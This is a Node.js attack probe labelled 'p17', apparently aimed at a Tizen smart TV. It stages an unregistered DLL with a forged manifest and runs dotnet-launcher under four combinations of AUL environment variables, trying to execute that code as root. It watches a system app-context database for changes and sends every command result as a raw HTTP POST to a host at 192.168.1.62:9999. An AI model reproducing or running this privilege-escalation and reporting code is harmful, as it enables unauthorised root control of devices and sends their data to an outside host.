"use strict";
/* p17: dotnet-launcher with AUL env vars — try to run our unregistered swap.dll as root */
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
var HOST = '192.168.1.62';
var PORT = 9999;
var SDK = '/home/owner/share/tmp/sdk_tools';
var APP = SDK + '/swapapp';
var R = { ts: new Date().toISOString(), probe: 'p17', results: {}, log: [] };
function L(s) { R.log.push(String(s).substring(0, 500)); }
function run(cmd, timeout) {
  try { return cp.execSync(cmd, { timeout: timeout || 30000, maxBuffer: 16*1024*1024 }).toString().trim(); }
  catch (e) { var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString(); return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text) {
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},60000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
function live(){ return run('md5sum /opt/dbspace/.app-context.db 2>&1', 15000); }
function markers(){ return 'done=['+run('cat /tmp/swap_done.txt 2>&1',5000)+'] err=['+run('cat /tmp/swap_err.txt 2>&1',5000)+']'; }
function dlogs(){ return run('ls -t /tmp/dotnet_error.* 2>/dev/null | head -3',5000); }

// ensure appdir setup (from p15) still there; re-setup to be safe
run('mkdir -p ' + APP + '/bin 2>&1', 5000);
run('cp ' + SDK + '/swap3.dll ' + APP + '/bin/swap.dll 2>&1', 5000);
try { fs.writeFileSync(APP + '/tizen-manifest.xml', '<?xml version="1.0" encoding="utf-8"?><manifest package="com.probe.swap" version="1.0.0" api-version="3.0" xmlns="http://tizen.org/ns/packages"><profile name="tv" /><ui-application appid="com.probe.swap" exec="swap.dll" multiple="false" nodisplay="false" taskmanage="false" type="dotnet" launch_mode="single"><label>swap</label></ui-application></manifest>'); } catch(e){ R.write='err '+e; }

R.results.live_before = live();
run('rm -f /tmp/swap_done.txt /tmp/swap_err.txt 2>&1', 5000);
R.results.dlogs_before = dlogs();

// combo 1: AUL_APP_ROOT + AUL_APPID + AUL_PKGID
R.results.run1 = run('AUL_APP_ROOT=' + APP + ' AUL_APPID=com.probe.swap AUL_PKGID=com.probe.swap /usr/bin/dotnet-launcher ' + APP + ' 2>&1', 30000);
R.results.after1 = markers() + ' live=' + live() + ' dlogs=' + dlogs();

// combo 2: + AUL_APP_PATH
R.results.run2 = run('AUL_APP_ROOT=' + APP + ' AUL_APPID=com.probe.swap AUL_PKGID=com.probe.swap AUL_APP_PATH=' + APP + '/bin/swap.dll /usr/bin/dotnet-launcher ' + APP + ' 2>&1', 30000);
R.results.after2 = markers() + ' live=' + live() + ' dlogs=' + dlogs();

// combo 3: argv = dll path, AUL_APP_PATH = dll
R.results.run3 = run('AUL_APP_ROOT=' + APP + ' AUL_APPID=com.probe.swap AUL_PKGID=com.probe.swap AUL_APP_PATH=' + APP + '/bin/swap.dll /usr/bin/dotnet-launcher ' + APP + '/bin/swap.dll 2>&1', 30000);
R.results.after3 = markers() + ' live=' + live() + ' dlogs=' + dlogs();

// combo 4: no argv, only AUL_APP_PATH
R.results.run4 = run('AUL_APP_ROOT=' + APP + ' AUL_APPID=com.probe.swap AUL_PKGID=com.probe.swap AUL_APP_PATH=' + APP + '/bin/swap.dll /usr/bin/dotnet-launcher 2>&1', 30000);
R.results.after4 = markers() + ' live=' + live() + ' dlogs=' + dlogs();

R.results.final = 'done ' + new Date().toISOString();
postRaw('/p17info', JSON.stringify(R));
L('p17 done');
